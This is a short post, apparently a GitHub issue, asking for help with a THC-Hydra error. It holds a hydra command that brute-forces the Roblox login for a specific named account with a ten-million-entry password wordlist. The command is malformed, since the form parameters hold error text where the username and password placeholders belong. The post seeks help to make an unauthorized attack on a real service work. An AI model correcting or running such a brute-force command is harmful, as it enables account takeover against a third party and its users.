HELLLO I NEED HELP WITH [ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^ #643


$ hydra roblox.com/Login -l atmfinesser -p /home/piotrcki-wordlist-top10m.txt http-post-form "/login.php:user=^Incorrect username^&amp;pass=^password.^: F LoginFunCaptcha_Triggered"  
